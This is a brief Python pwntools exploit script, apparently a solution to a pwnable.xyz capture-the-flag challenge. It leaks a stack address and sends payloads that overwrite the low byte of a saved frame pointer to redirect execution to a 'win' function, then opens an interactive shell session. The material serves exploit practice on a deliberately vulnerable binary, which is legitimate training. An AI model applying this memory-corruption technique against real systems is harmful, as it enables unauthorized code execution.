from pwn import *


debug = 1
e = ELF('./challenge')
win = e.symbols['win'] & 0xff
if not debug:
    sh = remote('svc.pwnable.xyz',30012)
else:
    sh = process('./challenge')

sh.sendlineafter('> ', '3')
stack_addr =  sh.recvline()
rbp_main = int(stack_addr, 16) - 0xf8
last_byte = rbp_main & 0xff

payload = str(win)
payload += "A"*0x1d
payload += p8(last_byte + 0x9)
log.info('stack addr = {:s}'.format(stack_addr))
log.info('last_byte = 0x{:x}'.format(last_byte))
sh.sendafter('> ', payload)

payload = '1'
payload += 'A'*0x1f
payload += p8(last_byte)
sh.sendafter('> ', payload)
print sh.recvall()
sh.interactive()
